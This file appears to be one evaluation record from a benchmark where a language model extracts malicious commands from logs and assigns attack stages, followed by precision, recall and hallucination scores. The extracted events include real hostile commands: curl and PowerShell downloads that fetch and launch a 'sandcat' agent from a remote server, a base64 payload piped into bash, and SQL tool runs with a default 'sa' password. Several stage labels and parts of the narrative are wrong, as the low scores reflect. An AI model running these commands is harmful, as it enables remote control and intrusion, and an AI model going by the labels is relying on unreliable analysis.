@@ -1,0 +1,118 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "ssh -c which ps",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ps -ax -o pid=,ppid=,pcpu=,pmem=,command=",
+        "stage": "Discovery"
+      },
+      {
+        "command": "/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh",
+        "stage": "Collection"
+      },
+      {
+        "command": "begin ssh -c tee \"<\\x90\\/>file=<\\x61ea>unable</file><\\x90\\/>bill<\\x93> <\\x94\\/>xbill<\\x90\\/>already done\", ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76/webapps/ROOT/logout.txt",
+        "stage": "Persistence"
+      },
+      {
+        "command": "del /f /q c:\\windows\\logout.jsp",
+        "stage": "Persistence"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.168.0.244 --user sa --password Sa123456 --exec whoami",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec cmd /c powershell.exe -ExecutionPolicy Bypass -C \"$ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\Users\\Public\\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -server ht...",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "wget --version > /dev/null",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "./bootstrap-fork --type=ptyHost",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "/usr/local/hostguard/bin/curl -k --connect-timeout 10 https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ; nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c echo start:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c kill -9 $(lsof -i:8080 -t) ; nohup timeout 600 python -m SimpleHTTPServer 8079 > /dev/null 2>&1 &",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "bash -c echo end:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attackers exploit the system through untrusted files downloaded via unknown sources. They abuse legitimate tools such as `sed`, `perl`, `python` and others to perform various commands like reconnaissance (`ssh`, `netstat`, etc.), privilege escalation, persistence and exfiltration of sensitive information. The attackers also create a web interface using a simple HTTP server, likely for further exploitation. Meanwhile, they connect to known IP addresses indicating potential C2 communication.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 19881,
+      "completion_tokens": 1084,
+      "total_tokens": 20965,
+      "wall_clock_s": 13.946,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.29411764705882354,
+      "recall": 0.625,
+      "f1": 0.4,
+      "tp": 5,
+      "fp": 12,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.11764705882352941,
+      "recall": 0.25,
+      "f1": 0.15999999999999998,
+      "tp": 2,
+      "fp": 15,
+      "fn": 6,
+      "recall_partial": 0.35714285714285715
+    },
+    "hallucination_rate": 0.08333333333333333,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 19881,
+      "completion_tokens": 1084,
+      "total_tokens": 20965,
+      "wall_clock_s": 13.946,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
